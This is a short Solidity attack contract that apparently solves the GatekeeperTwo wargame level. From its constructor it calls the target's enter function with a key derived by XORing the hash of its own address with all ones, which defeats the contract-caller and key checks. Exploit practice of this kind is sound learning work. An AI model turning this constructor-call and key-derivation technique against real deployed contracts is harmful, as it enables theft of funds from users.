// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    GatekeeperTwo target;
    bool public result;

    constructor(address _address) public {
        target = GatekeeperTwo(_address);

        //* xor is associative i.e. -> a ^ b = c => a ^ c = b
        bytes8 gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1)
        );

        // _address.call(abi.encodeWithSignature("enter(bytes8)", gateKey));
        result = target.enter(gateKey);
    }
}
